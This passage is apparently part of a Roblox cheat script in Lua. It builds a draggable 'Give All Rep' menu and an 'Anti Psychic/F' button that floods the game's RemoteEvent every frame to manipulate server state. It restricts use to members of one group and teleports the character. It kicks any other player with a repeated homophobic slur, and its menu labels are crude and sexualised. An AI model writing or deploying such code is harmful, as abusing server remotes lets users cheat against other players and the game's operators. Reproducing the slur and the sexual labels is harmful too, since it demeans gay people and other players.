TextButton_6.Position = UDim2.new(0.547691166, 0, 0.473186374, 0)
TextButton_6.Size = UDim2.new(0, 192, 0, 78)
TextButton_6.Font = Enum.Font.Sarpanch
TextButton_6.Text = "Anti Psychic/F"
TextButton_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.TextSize = 35.000
TextButton_6.TextStrokeTransparency = 0.800

TextButton_6.MouseButton1Click:Connect(function()

game:GetService("RunService").Heartbeat:Connect(function()
game.ReplicatedStorage.RemoteEvent:FireServer({"Weight","Weight1"})
task.wait()
game.ReplicatedStorage.RemoteEvent:FireServer({"Weight","Weight2"})
task.wait()
game.ReplicatedStorage.RemoteEvent:FireServer({"Weight","Weight1"})

end)

end)

UICorner_8.Parent = TextButton_6

Frame.Parent = GiveAllRepFrame
Frame.BackgroundColor3 = Color3.fromRGB(85, 0, 255)
Frame.Position = UDim2.new(0.980534494, 0, 0, 0)
Frame.Size = UDim2.new(0, 9, 0, 423)

Frame_2.Parent = GiveAllRepFrame
Frame_2.BackgroundColor3 = Color3.fromRGB(85, 0, 255)
Frame_2.Position = UDim2.new(-0.000908799469, 0, 0.000801950111, 0)
Frame_2.Size = UDim2.new(0, 9, 0, 423)

Frame_3.Parent = GiveAllRepFrame
Frame_3.BackgroundColor3 = Color3.fromRGB(170, 0, 127)
Frame_3.Position = UDim2.new(-0.00090879458, 0, 0, 0)
Frame_3.Size = UDim2.new(0, 485, 0, 11)

Frame_4.Parent = GiveAllRepFrame
Frame_4.BackgroundColor3 = Color3.fromRGB(170, 0, 127)
Frame_4.Position = UDim2.new(-0.00297064893, 0, 0.971698105, 0)
Frame_4.Size = UDim2.new(0, 485, 0, 11)

TextButton_7.Parent = ScreenGui
TextButton_7.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
TextButton_7.Position = UDim2.new(0, 0, 0.703429103, 0)
TextButton_7.Size = UDim2.new(0, 200, 0, 50)
TextButton_7.Font = Enum.Font.RobotoCondensed
TextButton_7.Text = "Open/Close"
TextButton_7.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_7.TextSize = 40.000

UICorner_9.Parent = TextButton_7

-- Scripts:

local function QLHYVQ_fake_script() -- GiveAllRepFrame.Dragify 
	local script = Instance.new('LocalScript', GiveAllRepFrame)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
		local dragSpeed = 0.05
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
	
	dragify(script.Parent)
end


coroutine.wrap(QLHYVQ_fake_script)()
local function GMZGCE_fake_script() -- TextButton_7.LocalScript 
	local script = Instance.new('LocalScript', TextButton_7)

	local frame = script.Parent.Parent.GiveAllRepFrame  -- change “Test” to the name of the frane
	local open = false
	
	script.Parent.MouseButton1Click:Connect(function()
		if frame.Visible == false then
			frame.Visible = true
		else
			frame.Visible = false
		end
	end)
	
end
coroutine.wrap(GMZGCE_fake_script)()
local plr = game:GetService("Players").LocalPlayer
if plr:IsInGroup("12871140") then

local NotificationBindable = Instance.new("BindableFunction")
NotificationBindable.OnInvoke = callback
--
game.StarterGui:SetCore("SendNotification",  {
 Title = "MestalicPenisPubesHub";
 Text = "Auto Remove Forcefield For Better Efficiency On Give All Rep";
 Icon = "";
 Duration = 5;
 Button1 = "SathLoves2GiveFemboysStats!";
 Callback = NotificationBindable;
})
wait(0.1)
	 wait(0.4)
                game.ReplicatedStorage.RemoteEvent:FireServer({"Respawn"})
            game.Lighting.Blur.Enabled = false
            game.Players.LocalPlayer.PlayerGui.IntroGui.Enabled = false
            game.Players.LocalPlayer.PlayerGui.ScreenGui.Enabled = true
    wait(2)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(291, 255, 846)
    wait()

	    else
    plr:Kick("Gay Gay Gay Gay Gay Gay Gay Gay Gay Gay Gay Gay") 
end
